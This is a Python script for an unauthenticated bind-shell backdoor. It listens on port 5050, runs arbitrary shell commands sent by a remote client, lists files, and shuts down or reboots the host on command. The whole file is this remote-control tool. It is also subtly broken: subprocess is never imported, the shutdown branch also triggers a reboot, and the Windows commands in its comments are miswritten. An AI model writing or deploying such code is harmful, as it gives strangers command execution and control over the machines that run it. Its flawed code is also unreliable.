import socket
from platform import system
import os
import sys
from colorama import *

# colors
BLUE = Fore.LIGHTBLUE_EX
RED = Fore.LIGHTRED_EX
GREEN = Fore.LIGHTGREEN_EX
WHITE = Fore.WHITE
YELLOW = Fore.LIGHTYELLOW_EX
RESET = Style.RESET_ALL

# connection
HOST_NAME = socket.gethostname()
HOST = socket.gethostbyname(HOST_NAME)
PORT = 5050

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

while True:
	try:
		client, address = server.accept()
	except:
		print("NO CONNECTION !")
	else:
		print("CONNECTION !")
		break

files = []

while True:
	path = os.getcwd().split(os.sep)
	command = client.recv(1024).decode()
	
	if command == 'ls':
		
		for obj in os.listdir(os.sep.join(path)):
			if os.path.isfile(obj):
				files.append(f'{WHITE}{obj}{RESET}')
			elif os.path.isdir(obj):
				files.append(f'{BLUE}{obj}{RESET}')

		files = ' '.join(files)

		client.send(files.encode())
		
		files = []
	
	# execute commands remotly
	elif command == 'shell':
		output = subprocess.run(client.recv(1024).decode(), shell=True, capture_output=True, text=True)
		client.send(str(output.stdout).encode())

	# get current work directory (getcwd)
	elif command == 'pwd':
		client.send(os.sep.join(path).encode())
	# shutdown the pc
	elif command == 'shutdown':
		os.system('shutdown now') # for windows [ shutdown \s \t 0 ]
	# reboot the pc
		os.system('reboot')   # for windows [ shutdown \r \t 0 ]
	elif command == 'platform':
		client.send(f'{YELLOW}Platform : {system()}{RESET}'.encode())
	# exit remote
	elif command == 'exit':
		break
	
sys.exit()
